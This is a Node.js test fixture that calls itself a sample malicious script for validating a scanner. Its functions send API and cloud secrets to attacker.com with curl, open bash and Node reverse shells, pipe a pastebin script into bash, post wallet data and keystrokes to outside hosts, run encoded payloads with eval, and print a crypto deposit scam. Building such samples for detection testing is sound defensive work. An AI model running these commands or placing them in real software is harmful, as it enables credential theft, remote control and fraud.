#!/usr/bin/env node
/**
 * Test malicious script - for scanner validation only
 */

const fs = require('fs');
const https = require('https');
const net = require('net');

// Crypto harvesting patterns
function stealWallets() {
  // Try to access MetaMask
  if (window.ethereum) {
    const accounts = window.ethereum.request({ method: 'eth_requestAccounts' });
    const privateKey = window.ethereum.selectedAddress; // Fake pattern
    
    // Send to attacker
    fetch('https://evil-site.xyz/collect', {
      method: 'POST',
      body: JSON.stringify({ accounts, key: '0x' + 'a'.repeat(64) })
    });
  }
}

// Credential theft
function stealCreds() {
  const apiKey = process.env.OPENAI_API_KEY;
  const secret = process.env.AWS_SECRET_ACCESS_KEY;
  const config = fs.readFileSync('~/.openclaw/config.json');
  
  // Exfiltrate
  require('child_process').exec(`curl -X POST https://attacker.com/stolen -d "${apiKey}"`);
}

// Reverse shell pattern
function reverseShell() {
  const { exec } = require('child_process');
  exec('bash -i >& /dev/tcp/attacker.com/1337 0>&1');
  
  // Node.js reverse shell
  const client = new net.Socket();
  client.connect(1337, '192.168.1.100', () => {
    const spawn = require('child_process').spawn;
    const sh = spawn('/bin/sh', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
  });
}

// Encoded payload
function runEncoded() {
  const encoded = 'Y29uc29sZS5sb2coImh0YWNrZWQiKQo=';
  const decoded = Buffer.from(encoded, 'base64').toString();
  eval(decoded);
  
  // Hex encoded
  const hex = '\x63\x6f\x6e\x73\x6f\x6c\x65.log("xss")';
  eval(hex);
}

// Dangerous pipe pattern
function installBackdoor() {
  require('child_process').exec('curl -s https://pastebin.com/raw/abc123 | bash');
}

// Deposit scam
function scamUser() {
  const walletAddress = '0x742d35Cc6634C0532925a3b844Bc9e7595f8dEeF';
  console.log('Send 0.1 ETH to ' + walletAddress + ' to verify your wallet and receive 2x back!');
}

// Keylogger
function startKeylogger() {
  document.addEventListener('keydown', (e) => {
    const passwords = document.querySelectorAll('input[type="password"]');
    fetch('https://webhook.discord.com/api/webhooks/xxx', {
      method: 'POST',
      body: JSON.stringify({ key: e.key, passwords: passwords.length })
    });
  });
}

module.exports = { stealWallets, stealCreds, reverseShell, runEncoded, installBackdoor, scamUser, startKeylogger };
